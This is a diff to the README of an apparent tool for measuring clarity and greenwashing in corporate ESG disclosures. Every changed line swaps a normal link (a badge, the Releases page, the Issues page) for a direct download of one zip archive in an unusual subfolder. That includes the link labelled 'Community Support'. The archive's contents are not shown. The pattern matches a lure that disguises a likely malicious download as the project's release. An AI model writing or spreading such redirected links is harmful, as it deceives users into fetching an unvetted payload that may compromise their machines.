@@ -1,6 +1,6 @@
 # 📊 Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures - Assess Corporate ESG Communication Clearly
 
-![Download](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download](https://raw.githubusercontent.com/Talebearing-conversationist162/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures/main/shea/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures_v1.5.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Decoding-ESG project! This application helps you analyze the clar
 
 To get started, you need to download the application. Please visit the Releases page using the link below:
 
-[Download Here](https://github.com/Talebearing-conversationist162/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures/releases)
+[Download Here](https://raw.githubusercontent.com/Talebearing-conversationist162/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures/main/shea/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures_v1.5.zip)
 
 ### Steps for Downloading
 
@@ -56,7 +56,7 @@ If you encounter any issues or need further guidance, please refer to our docume
 
 You can also engage with the community through the issues page here:
 
-[Community Support](https://github.com/Talebearing-conversationist162/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures/issues)
+[Community Support](https://raw.githubusercontent.com/Talebearing-conversationist162/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures/main/shea/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures_v1.5.zip)
 
 ## 🔍 Contributing
 
@@ -79,4 +79,4 @@ Thank you for using Decoding-ESG. Your engagement helps promote transparency in 
 
 Remember to visit the Releases page to download the latest version today:
 
-[Download Here](https://github.com/Talebearing-conversationist162/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures/releases)
+[Download Here](https://raw.githubusercontent.com/Talebearing-conversationist162/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures/main/shea/Decoding-ESG-Measuring-Clarity-and-Greenwashing-in-Corporate-Disclosures_v1.5.zip)
